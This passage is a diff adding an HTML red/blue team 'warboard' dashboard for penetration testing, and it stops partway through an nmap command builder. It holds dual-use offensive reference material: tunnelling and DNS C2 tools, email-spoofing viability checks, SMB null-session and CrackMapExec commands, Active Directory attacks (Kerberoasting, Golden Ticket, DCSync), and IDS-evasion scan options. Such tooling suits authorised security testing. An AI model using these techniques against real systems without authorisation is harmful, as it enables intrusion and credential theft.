@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WARBOARD v3</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:#080b10;color:#c9d1d9;font-family:'Courier New',monospace;font-size:12px;height:100vh;overflow:hidden;}
+.warboard{display:grid;grid-template-rows:50px 1fr;height:100vh;}
+.hdr{background:#0a0e14;border-bottom:1px solid #1e2630;display:flex;align-items:center;padding:0 12px;gap:10px;}
+.sdot{width:6px;height:6px;border-radius:50%;background:#00ff88;animation:pulse 2s infinite;flex-shrink:0;}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}
+.htitle{font-size:12px;font-weight:bold;letter-spacing:3px;white-space:nowrap;}
+.hdiv{width:1px;height:22px;background:#1e2630;flex-shrink:0;}
+.opstatus{font-size:9px;letter-spacing:2px;white-space:nowrap;}
+.mode-sw{display:flex;border:1px solid #1e2630;overflow:hidden;flex-shrink:0;}
+.mbtn{padding:4px 12px;cursor:pointer;font-family:inherit;font-size:10px;letter-spacing:2px;border:none;background:transparent;transition:all 0.2s;}
+.mbtn.red-m{color:#ff453a55;}.mbtn.red-m.act{background:#ff453a12;color:#ff453a;}
+.mbtn.blue-m{color:#58a6ff55;}.mbtn.blue-m.act{background:#58a6ff12;color:#58a6ff;}
+.clocks{display:flex;gap:14px;align-items:center;margin-left:auto;}
+.ci{text-align:center;}.ctz{color:#4a5568;font-size:9px;letter-spacing:1px;}
+.ct{font-size:11px;font-weight:bold;letter-spacing:1px;}
+.tblock{display:flex;align-items:center;gap:7px;border-left:1px solid #1e2630;padding-left:10px;flex-shrink:0;}
+.tlbl{color:#4a5568;font-size:9px;letter-spacing:2px;}
+.ttime{color:#ff6b35;font-size:15px;font-weight:bold;min-width:76px;font-variant-numeric:tabular-nums;}
+.btn{background:transparent;border:1px solid #2d3748;color:#8b949e;padding:3px 9px;cursor:pointer;font-family:inherit;font-size:10px;letter-spacing:1px;transition:all 0.15s;}
+.btn:hover{border-color:#00ff88;color:#00ff88;}
+.btn.xred{border-color:#2d1515;color:#ff453a44;}.btn.xred:hover{border-color:#ff453a;color:#ff453a;}
+.btn.abtn{border-color:#00ff88;color:#00ff88;}
+.main{display:grid;grid-template-columns:1fr 295px;overflow:hidden;height:calc(100vh - 50px);}
+.lp{display:flex;flex-direction:column;border-right:1px solid #1e2630;overflow:hidden;}
+.tabs{display:flex;background:#0a0e14;border-bottom:1px solid #1e2630;overflow-x:auto;}
+.tabs::-webkit-scrollbar{display:none;}
+.tab{padding:0 13px;height:36px;display:flex;align-items:center;cursor:pointer;color:#4a5568;font-size:10px;letter-spacing:2px;border-bottom:2px solid transparent;white-space:nowrap;transition:all 0.15s;flex-shrink:0;}
+.tab:hover{color:#8b949e;}.tab.act{color:#00ff88;border-bottom-color:#00ff88;}
+.tc{display:none;flex:1;overflow-y:auto;padding:12px;}.tc.act{display:block;}
+.tc::-webkit-scrollbar{width:3px;}.tc::-webkit-scrollbar-thumb{background:#1e2630;}
+.slbl{color:#4a5568;font-size:9px;letter-spacing:3px;margin-bottom:7px;margin-top:14px;}
+.slbl:first-child{margin-top:0;}
+.phase{margin-bottom:7px;border:1px solid #1e2630;}
+.phdr{display:flex;align-items:center;justify-content:space-between;padding:8px 11px;cursor:pointer;background:#0c1018;user-select:none;transition:background 0.15s;}
+.phdr:hover{background:#111722;}
+.ptitle{font-size:11px;font-weight:bold;letter-spacing:1px;}
+.pright{display:flex;align-items:center;gap:10px;}
+.nrow{display:flex;align-items:center;gap:4px;}.nlbl{color:#4a5568;font-size:9px;}
+.ndots{display:flex;gap:3px;}
+.nd{width:6px;height:6px;border-radius:50%;background:#1e2630;}
+.nd.low{background:#00ff88;}.nd.med{background:#f0a500;}.nd.hi{background:#ff453a;}
+.ptog{color:#4a5568;font-size:10px;width:12px;text-align:center;}
+.pbody{display:none;padding:10px;background:#080b10;border-top:1px solid #1e2630;}
+.pbody.open{display:block;}
+.pobj{color:#8b949e;font-size:10px;margin-bottom:9px;border-left:2px solid #00ff8833;padding-left:8px;line-height:1.5;}
+.tlist{display:flex;flex-direction:column;gap:4px;margin-bottom:9px;}
+.ti{background:#0c1018;border:1px solid #1e2630;padding:6px 8px;display:flex;gap:7px;align-items:flex-start;transition:border-color 0.2s;}
+.ti.confirmed{border-color:#00ff8844;background:#00ff8805;}
+.tchk{margin-top:1px;flex-shrink:0;}
+.tchk input[type=checkbox]{appearance:none;-webkit-appearance:none;width:13px;height:13px;border:1px solid #2d3748;background:#080b10;cursor:pointer;position:relative;display:block;}
+.tchk input[type=checkbox]:checked{background:#00ff8818;border-color:#00ff88;}
+.tchk input[type=checkbox]:checked::after{content:"v";position:absolute;top:-2px;left:2px;font-size:10px;color:#00ff88;font-weight:bold;}
+.tcont{flex:1;min-width:0;}
+.tname{color:#c9d1d9;font-size:10px;font-weight:bold;margin-bottom:3px;}
+.ttools{font-size:9px;margin-bottom:2px;color:#4a5568;line-height:1.6;}
+.tl{color:#58a6ff;text-decoration:none;margin-right:5px;font-size:9px;transition:color 0.1s;}
+.tl:hover{color:#00ff88;}
+.tflags{font-size:9px;color:#ff453a;}
+.pcols{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px;}
+.clbl{color:#4a5568;font-size:9px;letter-spacing:2px;margin-bottom:3px;}
+.cbody{font-size:10px;color:#c9d1d9;line-height:1.6;}
+.cbody.dng{color:#ff6b35;}.cbody.ioc{color:#f0a500;}.cbody.siem{color:#58a6ff;font-size:9px;}
+.fta{width:100%;background:#0a0e14;border:1px solid #1e2630;color:#c9d1d9;font-family:inherit;font-size:10px;padding:6px;resize:vertical;min-height:38px;}
+.fta:focus{outline:none;border-color:#00ff8844;}
+.mlnk{display:inline-block;color:#58a6ff;font-size:9px;text-decoration:none;margin-top:5px;letter-spacing:1px;}
+.mlnk:hover{color:#00ff88;}
+.p-r .ptitle{color:#58a6ff;}.p-w .ptitle{color:#f0a500;}.p-d .ptitle{color:#ff6b35;}
+.p-e .ptitle{color:#ff453a;}.p-i .ptitle{color:#bf5af2;}.p-c .ptitle{color:#00ff88;}.p-a .ptitle{color:#ffd60a;}
+.b-p .ptitle{color:#58a6ff;}.b-i .ptitle{color:#00ff88;}.b-e .ptitle{color:#f0a500;}
+.b-n .ptitle{color:#bf5af2;}.b-d .ptitle{color:#ffd60a;}.b-r .ptitle{color:#ff453a;}
+.irow{display:flex;gap:5px;margin-bottom:7px;flex-wrap:wrap;}
+.inp{background:#0c1018;border:1px solid #1e2630;color:#c9d1d9;font-family:inherit;font-size:11px;padding:5px 7px;}
+.inp:focus{outline:none;border-color:#00ff8844;}
+.inp.sm{width:105px;}.inp.md{flex:1;min-width:80px;}
+.sel{background:#0c1018;border:1px solid #1e2630;color:#8b949e;font-family:inherit;font-size:10px;padding:5px;}
+.iptbl{width:100%;border-collapse:collapse;}
+.iptbl th{color:#4a5568;font-size:9px;letter-spacing:2px;text-align:left;padding:4px 6px;border-bottom:1px solid #1e2630;}
+.iptbl td{padding:4px 6px;font-size:10px;border-bottom:1px solid #1e263020;vertical-align:middle;}
+.iptbl tr:hover td{background:#0c1018;}
+.tag{display:inline-block;padding:1px 5px;font-size:9px;letter-spacing:1px;border:1px solid;}
+.tag.dc{background:#ff453a11;color:#ff453a;border-color:#ff453a33;}
+.tag.web{background:#58a6ff11;color:#58a6ff;border-color:#58a6ff33;}
+.tag.smb{background:#f0a50011;color:#f0a500;border-color:#f0a50033;}
+.tag.ssh{background:#00ff8811;color:#00ff88;border-color:#00ff8833;}
+.tag.owned{background:#bf5af211;color:#bf5af2;border-color:#bf5af233;}
+.tag.tunnel{background:#ff6b3511;color:#ff6b35;border-color:#ff6b3533;}
+.tag.pivot{background:#ffd60a11;color:#ffd60a;border-color:#ffd60a33;}
+.del{color:#ff453a33;cursor:pointer;font-size:12px;transition:color 0.15s;}.del:hover{color:#ff453a;}
+.tcanv{background:#0c1018;border:1px solid #1e2630;padding:10px;min-height:75px;margin-bottom:7px;display:flex;align-items:center;flex-wrap:wrap;gap:4px;}
+.tnode{display:inline-flex;align-items:center;gap:4px;background:#0a0e14;border:1px solid #2d3748;padding:3px 8px;font-size:10px;}
+.tnode.entry{border-color:#00ff8866;color:#00ff88;}.tnode.pivot{border-color:#f0a50066;color:#f0a500;}.tnode.target{border-color:#ff453a66;color:#ff453a;}
+.tarr{color:#4a5568;margin:0 2px;}
+.schain{display:flex;align-items:center;flex-wrap:wrap;gap:4px;background:#0c1018;border:1px solid #1e2630;padding:6px 9px;margin-bottom:5px;}
+.scnote{font-size:9px;color:#4a5568;margin-left:5px;}
+.rcard{background:#0c1018;border:1px solid #1e2630;padding:9px 11px;margin-bottom:9px;}
+.rtitle{color:#00ff88;font-size:9px;font-weight:bold;letter-spacing:3px;margin-bottom:7px;}
+.rtbl{width:100%;border-collapse:collapse;}
+.rtbl td{padding:3px 5px;font-size:10px;border-bottom:1px solid #1e263020;line-height:1.5;}
+.rtbl td:first-child{color:#f0a500;white-space:nowrap;padding-right:10px;}
+.rtbl td:last-child{color:#8b949e;}
+.scta{width:100%;height:100px;background:#0a0e14;border:1px solid #1e2630;color:#c9d1d9;font-family:inherit;font-size:11px;padding:8px;resize:vertical;line-height:1.6;}
+.scta:focus{outline:none;border-color:#00ff8844;}
+.snres{background:#0c1018;border:1px solid #1e2630;padding:9px 11px;margin-top:7px;font-size:11px;line-height:2;display:none;}
+.srk{color:#00ff88;}.srv{color:#c9d1d9;}
+/* CMD BLOCKS */
+.cmd-block{display:flex;flex-direction:column;gap:4px;}
+.cmd-label{color:#4a5568;font-size:9px;letter-spacing:1px;margin-top:6px;}
+.cmd-label:first-child{margin-top:0;}
+.cmd{background:#080b10;border:1px solid #1e2630;border-left:2px solid #00ff8833;color:#00ff88;font-family:'Courier New',monospace;font-size:10px;padding:5px 8px;cursor:pointer;transition:border-color 0.15s;word-break:break-all;}
+.cmd:hover{border-left-color:#00ff88;border-color:#00ff8844;}
+.cmd.blue-cmd{border-left-color:#58a6ff33;color:#58a6ff;}
+.cmd.blue-cmd:hover{border-left-color:#58a6ff;}
+.cmd-warn{color:#f0a500;font-size:9px;margin-top:4px;border-left:2px solid #f0a50033;padding-left:6px;line-height:1.5;}
+.cmd-copied{color:#00ff88;font-size:9px;position:absolute;right:8px;top:50%;transform:translateY(-50%);pointer-events:none;opacity:0;transition:opacity 0.3s;}
+.cmd-wrap{position:relative;}
+/* BOOKMARKS */
+.bcat{margin-bottom:11px;}.bcatlbl{color:#4a5568;font-size:9px;letter-spacing:3px;margin-bottom:5px;}
+.bitem{display:flex;align-items:center;gap:7px;padding:5px 8px;background:#0c1018;border:1px solid #1e2630;margin-bottom:3px;cursor:pointer;transition:border-color 0.15s;text-decoration:none;}
+.bitem:hover{border-color:#00ff8844;}
+.bdot{width:5px;height:5px;border-radius:50%;flex-shrink:0;}
+.blbl{color:#c9d1d9;font-size:10px;flex:1;}.btag{color:#4a5568;font-size:9px;}
+/* NMAP BUILDER */
+.nmap-builder{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+.nmap-col{display:flex;flex-direction:column;gap:6px;}
+.nmap-group{background:#0c1018;border:1px solid #1e2630;padding:9px 11px;}
+.nmap-group-title{color:#00ff88;font-size:9px;letter-spacing:2px;margin-bottom:8px;}
+.nmap-opt{display:flex;align-items:flex-start;gap:7px;margin-bottom:5px;cursor:pointer;}
+.nmap-opt input[type=checkbox],.nmap-opt input[type=radio]{appearance:none;-webkit-appearance:none;width:12px;height:12px;border:1px solid #2d3748;background:#080b10;cursor:pointer;position:relative;flex-shrink:0;margin-top:1px;}
+.nmap-opt input:checked{background:#00ff8818;border-color:#00ff88;}
+.nmap-opt input:checked::after{content:"v";position:absolute;top:-2px;left:1px;font-size:10px;color:#00ff88;font-weight:bold;}
+.nmap-opt-lbl{font-size:10px;color:#c9d1d9;line-height:1.4;}
+.nmap-opt-sw{color:#f0a500;font-size:9px;margin-left:4px;}
+.nmap-opt-desc{color:#4a5568;font-size:9px;display:block;}
+.nmap-target-row{display:flex;gap:6px;margin-bottom:10px;}
+.nmap-output{background:#080b10;border:1px solid #00ff8844;border-left:3px solid #00ff88;padding:10px 12px;font-family:'Courier New',monospace;font-size:11px;color:#00ff88;min-height:44px;word-break:break-all;cursor:pointer;transition:border-color 0.2s;}
+.nmap-output:hover{border-color:#00ff88;}
+.nmap-output-label{color:#4a5568;font-size:9px;letter-spacing:2px;margin-bottom:5px;}
+.nmap-copy-hint{color:#4a5568;font-size:9px;margin-top:4px;}
+/* RIGHT */
+.rp{display:flex;flex-direction:column;overflow:hidden;background:#0a0e14;}
+.rsec{padding:10px 12px;border-bottom:1px solid #1e2630;}
+.rsec.fg{flex:1;overflow-y:auto;}.rsec.fg::-webkit-scrollbar{width:3px;}.rsec.fg::-webkit-scrollbar-thumb{background:#1e2630;}
+.rtit{color:#00ff88;font-size:9px;letter-spacing:3px;margin-bottom:8px;}
+.pi{display:flex;align-items:center;gap:7px;margin-bottom:5px;}
+.pname{color:#4a5568;font-size:9px;width:72px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.ptrack{flex:1;height:3px;background:#1e2630;}.pfill{height:3px;transition:width 0.4s,background 0.4s;}
+.pstat{font-size:9px;width:54px;text-align:right;}
+.olog{max-height:110px;overflow-y:auto;display:flex;flex-direction:column;gap:3px;margin-bottom:7px;}
+.olog::-webkit-scrollbar{width:3px;}.olog::-webkit-scrollbar-thumb{background:#1e2630;}
+.le{display:flex;gap:7px;}
+.lt{color:#4a5568;font-size:9px;white-space:nowrap;padding-top:1px;}
+.lm{color:#c9d1d9;font-size:10px;line-height:1.4;}
+.linrow{display:flex;gap:4px;}
+.lin{flex:1;background:#080b10;border:1px solid #1e2630;color:#c9d1d9;font-family:inherit;font-size:10px;padding:4px 6px;}
+.lin:focus{outline:none;border-color:#00ff8844;}
+.pci{margin-bottom:9px;}.pcn{color:#4a5568;font-size:9px;letter-spacing:1px;margin-bottom:3px;}
+.pcbs{display:flex;gap:3px;flex-wrap:wrap;}
+.pcb{background:transparent;border:1px solid #1e2630;color:#4a5568;padding:2px 7px;cursor:pointer;font-family:inherit;font-size:9px;letter-spacing:1px;transition:all 0.15s;}
+.pcb:hover{border-color:#4a5568;color:#8b949e;}
+.pcb.s-none{border-color:#2d3748;color:#4a5568;}
+.pcb.s-recon{border-color:#58a6ff66;color:#58a6ff;}
+.pcb.s-active{border-color:#f0a50066;color:#f0a500;}
+.pcb.s-done{border-color:#00ff8866;color:#00ff88;}
+.pcb.s-owned{border-color:#bf5af266;color:#bf5af2;}
+</style>
+</head>
+<body>
+<div class="warboard">
+<div class="hdr">
+  <div class="sdot"></div>
+  <div class="htitle" id="boardTitle" style="color:#00ff88;">RED TEAM WARBOARD</div>
+  <div class="hdiv"></div>
+  <div class="opstatus" id="opStat" style="color:#00ff88;">STANDBY</div>
+  <div class="hdiv"></div>
+  <div class="mode-sw">
+    <button class="mbtn red-m act" id="rmBtn" onclick="setMode('red')">RED TEAM</button>
+    <button class="mbtn blue-m" id="bmBtn" onclick="setMode('blue')">BLUE TEAM</button>
+  </div>
+  <div class="clocks" id="clocks"></div>
+  <div class="tblock">
+    <span class="tlbl">OP TIMER</span>
+    <span class="ttime" id="tdisp">00:00:00</span>
+    <button class="btn" id="tbtn" onclick="toggleTimer()">START</button>
+    <button class="btn xred" onclick="resetTimer()">RESET</button>
+  </div>
+</div>
+<div class="main">
+<div class="lp">
+  <div class="tabs" id="tabBar"></div>
+
+  <!-- RED MITRE -->
+  <div class="tc act" id="tc-mitre"><div id="mitreC"></div></div>
+
+  <!-- IP MAPPER -->
+  <div class="tc" id="tc-ipmapper">
+    <div class="slbl">Add Host</div>
+    <div class="irow">
+      <input class="inp sm" id="ipA" placeholder="IP / CIDR">
+      <input class="inp md" id="ipH" placeholder="Hostname">
+      <input class="inp md" id="ipN" placeholder="Notes / ports">
+      <select class="sel" id="ipT">
+        <option value="owned">OWNED</option><option value="dc">DC</option><option value="web">WEB</option>
+        <option value="smb">SMB</option><option value="ssh">SSH</option><option value="tunnel">TUNNEL</option><option value="pivot">PIVOT</option>
+      </select>
+      <button class="btn" onclick="addIP()">ADD</button>
+    </div>
+    <table class="iptbl"><thead><tr><th>IP</th><th>HOST</th><th>TAG</th><th>NOTES</th><th></th></tr></thead><tbody id="ipBody"></tbody></table>
+    <div class="slbl">Engagement Notes</div>
+    <textarea class="scta" style="height:70px;" placeholder="Scope, exclusions, rules of engagement..."></textarea>
+  </div>
+
+  <!-- TUNNELS -->
+  <div class="tc" id="tc-tunnels">
+    <div class="slbl">Chain Builder</div>
+    <div class="irow">
+      <input class="inp md" id="tnN" placeholder="Node label">
+      <select class="sel" id="tnT"><option value="entry">ENTRY</option><option value="pivot">PIVOT</option><option value="target">TARGET</option></select>
+      <input class="inp" style="width:80px;" id="tnP" placeholder="Port">
+      <button class="btn" onclick="addTN()">ADD</button>
+    </div>
+    <div class="tcanv" id="tcanv"><span style="color:#2d3748;font-size:10px;">Build pivot chain above...</span></div>
+    <div style="display:flex;gap:5px;margin-bottom:12px;">
+      <button class="btn" onclick="saveTC()">SAVE CHAIN</button>
+      <button class="btn xred" onclick="clearTC()">CLEAR</button>
+    </div>
+    <div class="slbl">Saved Chains</div><div id="savedC"></div>
+    <div class="slbl" style="margin-top:14px;">Tunnel Ref</div>
+    <div class="rcard"><table class="rtbl">
+      <tr><td>ssh -L</td><td>Local forward -- remote port to localhost</td></tr>
+      <tr><td>ssh -R</td><td>Remote forward -- expose local port remotely</td></tr>
+      <tr><td>ssh -D</td><td>SOCKS proxy (dynamic forwarding)</td></tr>
+      <tr><td>ssh on 443</td><td>Blends with HTTPS -- watch JA3 fingerprint</td></tr>
+      <tr><td>Chisel</td><td>HTTP tunnel, client/server, firewall bypass</td></tr>
+      <tr><td>Ligolo-ng</td><td>TUN interface pivot -- clean, low noise</td></tr>
+      <tr><td>Proxychains</td><td>Route any tool through SOCKS proxy</td></tr>
+      <tr><td>dnscat2</td><td>DNS C2 tunnel -- slow, very hard to block</td></tr>
+    </table></div>
+  </div>
+
+  <!-- KNOWLEDGE -->
+  <div class="tc" id="tc-knowledge">
+    <div class="rcard"><div class="rtitle">DNS RECORDS</div><table class="rtbl">
+      <tr><td>A</td><td>Domain to IPv4 address</td></tr>
+      <tr><td>AAAA</td><td>Domain to IPv6 (often less hardened)</td></tr>
+      <tr><td>MX</td><td>Mail server -- reveals provider, informs phishing</td></tr>
+      <tr><td>TXT</td><td>SPF, DMARC, DKIM, verification tokens</td></tr>
+      <tr><td>NS</td><td>Nameservers -- target for AXFR zone transfers</td></tr>
+      <tr><td>CNAME</td><td>Alias -- check for subdomain takeover</td></tr>
+      <tr><td>PTR</td><td>Reverse DNS -- IP to hostname</td></tr>
+      <tr><td>SOA</td><td>Zone authority -- admin email, serial number</td></tr>
+      <tr><td>SRV</td><td>Service location -- Kerberos, LDAP, SIP</td></tr>
+      <tr><td>AXFR</td><td>Zone transfer -- dumps full zone if misconfigured</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">SPF / DMARC</div><table class="rtbl">
+      <tr><td>~all softfail</td><td>Spoofing viable -- mail still delivered</td></tr>
+      <tr><td>-all hardfail</td><td>Rejected if not from authorised sender</td></tr>
+      <tr><td>p=none</td><td>No DMARC enforcement -- spoofed mail lands</td></tr>
+      <tr><td>p=quarantine</td><td>Fails to spam -- still delivered</td></tr>
+      <tr><td>p=reject</td><td>Hard block -- find another phishing route</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">SMB</div><table class="rtbl">
+      <tr><td>Port 445</td><td>SMB direct (modern standard)</td></tr>
+      <tr><td>Port 139</td><td>SMB over NetBIOS (legacy)</td></tr>
+      <tr><td>SMBv1</td><td>EternalBlue MS17-010 -- check first, can crash</td></tr>
+      <tr><td>Null session</td><td>smbclient -L //target -N</td></tr>
+      <tr><td>enum4linux</td><td>Full SMB/AD enumeration</td></tr>
+      <tr><td>CrackMapExec</td><td>cme smb subnet -u user -p pass</td></tr>
+      <tr><td>Signing off</td><td>NTLM relay via Responder + ntlmrelayx</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">AD QUICK REF</div><table class="rtbl">
+      <tr><td>whoami /all</td><td>Current user groups + privileges</td></tr>
+      <tr><td>Kerberoasting</td><td>Request TGS for SPN accounts, crack offline</td></tr>
+      <tr><td>AS-REP Roast</td><td>Preauth disabled accounts -- no creds needed</td></tr>
+      <tr><td>Pass-the-Hash</td><td>NTLM hash -- auth without plaintext</td></tr>
+      <tr><td>Golden Ticket</td><td>KRBTGT hash + domain SID -- forge any TGT</td></tr>
+      <tr><td>DCSync</td><td>Replicate DC -- pull all hashes (needs rights)</td></tr>
+      <tr><td>BloodHound</td><td>SharpHound collector -- graph path to DA</td></tr>
+    </table></div>
+    <div class="slbl">Scratch Pad</div>
+    <textarea class="scta" placeholder="Hashes, creds, commands, findings..."></textarea>
+  </div>
+
+  <!-- SUBNET -->
+  <div class="tc" id="tc-subnet">
+    <div class="slbl">Subnet Calculator</div>
+    <div class="irow">
+      <input class="inp md" id="snI" placeholder="192.168.1.0/24" onkeydown="if(event.key==='Enter')doSN('snI','snR')">
+      <button class="btn" onclick="doSN('snI','snR')">CALC</button>
+    </div>
+    <div class="snres" id="snR"></div>
+    <div class="slbl" style="margin-top:16px;">CIDR Reference</div>
+    <div class="rcard"><table class="rtbl">
+      <tr><td>/8</td><td>16,777,214 hosts -- Class A</td></tr>
+      <tr><td>/16</td><td>65,534 hosts -- Class B</td></tr>
+      <tr><td>/24</td><td>254 hosts -- Class C (most common)</td></tr>
+      <tr><td>/25</td><td>126 hosts</td></tr><tr><td>/26</td><td>62 hosts</td></tr>
+      <tr><td>/27</td><td>30 hosts</td></tr><tr><td>/28</td><td>14 hosts</td></tr>
+      <tr><td>/29</td><td>6 hosts</td></tr><tr><td>/30</td><td>2 hosts (P2P)</td></tr>
+      <tr><td>/32</td><td>Single host</td></tr>
+    </table></div>
+    <div class="rcard"><div class="rtitle">PRIVATE RANGES</div><table class="rtbl">
+      <tr><td>10.0.0.0/8</td><td>Class A private</td></tr>
+      <tr><td>172.16.0.0/12</td><td>Class B private</td></tr>
+      <tr><td>192.168.0.0/16</td><td>Class C private</td></tr>
+      <tr><td>169.254.0.0/16</td><td>APIPA / link-local</td></tr>
+      <tr><td>127.0.0.0/8</td><td>Loopback</td></tr>
+    </table></div>
+  </div>
+
+  <!-- NMAP BUILDER -->
+  <div class="tc" id="tc-nmap">
+    <div class="slbl">Target</div>
+    <div class="nmap-target-row">
+      <input class="inp md" id="nmapTarget" placeholder="IP, range, or hostname e.g. 10.0.0.0/24" oninput="buildNmap()">
+      <input class="inp" style="width:140px;" id="nmapOutput" placeholder="Output file (optional)" oninput="buildNmap()">
+    </div>
+    <div class="nmap-builder">
+      <div class="nmap-col">
+        <div class="nmap-group">
+          <div class="nmap-group-title">SCAN TYPE</div>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sS" checked onchange="buildNmap()"><span class="nmap-opt-lbl">SYN Scan <span class="nmap-opt-sw">-sS</span><span class="nmap-opt-desc">Default, fast, half-open -- requires root</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sT" onchange="buildNmap()"><span class="nmap-opt-lbl">TCP Connect <span class="nmap-opt-sw">-sT</span><span class="nmap-opt-desc">Full connection -- no root needed, noisier</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sU" onchange="buildNmap()"><span class="nmap-opt-lbl">UDP Scan <span class="nmap-opt-sw">-sU</span><span class="nmap-opt-desc">Slow -- DNS, SNMP, DHCP discovery</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sN" onchange="buildNmap()"><span class="nmap-opt-lbl">Null Scan <span class="nmap-opt-sw">-sN</span><span class="nmap-opt-desc">No flags -- firewall bypass attempt</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sF" onchange="buildNmap()"><span class="nmap-opt-lbl">FIN Scan <span class="nmap-opt-sw">-sF</span><span class="nmap-opt-desc">FIN flag only -- IDS evasion</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sX" onchange="buildNmap()"><span class="nmap-opt-lbl">Xmas Scan <span class="nmap-opt-sw">-sX</span><span class="nmap-opt-desc">FIN+PSH+URG -- IDS evasion</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="scantype" value="-sn" onchange="buildNmap()"><span class="nmap-opt-lbl">Ping Sweep <span class="nmap-opt-sw">-sn</span><span class="nmap-opt-desc">Host discovery only -- no port scan</span></span></label>
+        </div>
+        <div class="nmap-group">
+          <div class="nmap-group-title">PORT RANGE</div>
+          <label class="nmap-opt"><input type="radio" name="portrange" value="" checked onchange="buildNmap()"><span class="nmap-opt-lbl">Top 1000 <span class="nmap-opt-desc">Default nmap port selection</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="portrange" value="-p-" onchange="buildNmap()"><span class="nmap-opt-lbl">All 65535 ports <span class="nmap-opt-sw">-p-</span><span class="nmap-opt-desc">Slow but comprehensive</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="portrange" value="-p 80,443,8080,8443,22,21,25,3306,5432,1433,3389,445,139" onchange="buildNmap()"><span class="nmap-opt-lbl">Common web+service <span class="nmap-opt-desc">Key ports for quick triage</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="portrange" value="CUSTOM" onchange="buildNmap()"><span class="nmap-opt-lbl">Custom <span class="nmap-opt-desc">Enter below</span></span></label>
+          <input class="inp" style="width:100%;margin-top:4px;" id="nmapCustomPort" placeholder="-p 22,80,443 or -p 1-1024" oninput="buildNmap()">
+        </div>
+        <div class="nmap-group">
+          <div class="nmap-group-title">SPEED / TIMING</div>
+          <label class="nmap-opt"><input type="radio" name="timing" value="-T1" onchange="buildNmap()"><span class="nmap-opt-lbl">T1 Sneaky <span class="nmap-opt-sw">-T1</span><span class="nmap-opt-desc">Very slow -- IDS evasion</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="timing" value="-T2" onchange="buildNmap()"><span class="nmap-opt-lbl">T2 Polite <span class="nmap-opt-sw">-T2</span><span class="nmap-opt-desc">Slow -- low bandwidth</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="timing" value="-T3" checked onchange="buildNmap()"><span class="nmap-opt-lbl">T3 Normal <span class="nmap-opt-sw">-T3</span><span class="nmap-opt-desc">Default speed</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="timing" value="-T4" onchange="buildNmap()"><span class="nmap-opt-lbl">T4 Aggressive <span class="nmap-opt-sw">-T4</span><span class="nmap-opt-desc">Fast -- good networks</span></span></label>
+          <label class="nmap-opt"><input type="radio" name="timing" value="-T5" onchange="buildNmap()"><span class="nmap-opt-lbl">T5 Insane <span class="nmap-opt-sw">-T5</span><span class="nmap-opt-desc">Very fast -- may miss ports</span></span></label>
+        </div>
+      </div>
+      <div class="nmap-col">
+        <div class="nmap-group">
+          <div class="nmap-group-title">DETECTION OPTIONS</div>
+          <label class="nmap-opt"><input type="checkbox" id="no-sV" onchange="buildNmap()"><span class="nmap-opt-lbl">Service version <span class="nmap-opt-sw">-sV</span><span class="nmap-opt-desc">Detect service versions on open ports</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-O" onchange="buildNmap()"><span class="nmap-opt-lbl">OS detection <span class="nmap-opt-sw">-O</span><span class="nmap-opt-desc">Fingerprint OS -- requires root</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-sC" onchange="buildNmap()"><span class="nmap-opt-lbl">Default scripts <span class="nmap-opt-sw">-sC</span><span class="nmap-opt-desc">Run default NSE scripts</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-A" onchange="buildNmap()"><span class="nmap-opt-lbl">Aggressive mode <span class="nmap-opt-sw">-A</span><span class="nmap-opt-desc">OS + version + scripts + traceroute</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-Pn" onchange="buildNmap()"><span class="nmap-opt-lbl">Skip ping <span class="nmap-opt-sw">-Pn</span><span class="nmap-opt-desc">Treat all hosts as up -- skip ICMP</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-n" onchange="buildNmap()"><span class="nmap-opt-lbl">No DNS resolution <span class="nmap-opt-sw">-n</span><span class="nmap-opt-desc">Faster -- skip reverse DNS</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="no-v" onchange="buildNmap()"><span class="nmap-opt-lbl">Verbose <span class="nmap-opt-sw">-v</span><span class="nmap-opt-desc">Show results as they come in</span></span></label>
+        </div>
+        <div class="nmap-group">
+          <div class="nmap-group-title">NSE SCRIPTS</div>
+          <label class="nmap-opt"><input type="checkbox" id="sc-vuln" onchange="buildNmap()"><span class="nmap-opt-lbl">Vuln scan <span class="nmap-opt-sw">--script vuln</span><span class="nmap-opt-desc">Check for known CVEs -- noisy</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="sc-smb" onchange="buildNmap()"><span class="nmap-opt-lbl">SMB vuln + enum <span class="nmap-opt-sw">--script smb*</span><span class="nmap-opt-desc">MS17-010, shares, users</span></span></label>
+          <label class="nmap-opt"><input type="checkbox" id="sc-http" onchange="buildNmap()"><span class="nmap-opt-lbl">HTTP enum <span class="nmap-opt-sw">--script http-enum</span><span class="nmap-opt-desc">Web directory brute forcing</span></span></label>
